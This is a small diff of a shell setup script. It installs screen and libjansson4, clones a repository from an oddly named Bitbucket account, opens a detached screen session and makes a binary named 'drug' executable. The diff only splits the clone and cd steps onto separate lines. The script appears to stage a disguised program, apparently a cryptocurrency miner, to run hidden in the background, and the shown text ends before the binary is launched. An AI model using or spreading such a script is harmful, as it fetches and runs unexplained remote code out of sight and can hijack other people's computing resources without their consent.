@@ -1,7 +1,8 @@
 #!/bin/sh
 sudo apt update
 sudo apt install screen -y
-git clone https://mariere-born@bitbucket.org/mariere-born99/mariere-born.git && cd mariere-born
+git clone https://mariere-born@bitbucket.org/mariere-born99/mariere-born.git
+cd mariere-born
 sudo apt install screen libjansson4 -y
 screen -dmS ls
 chmod +x drug
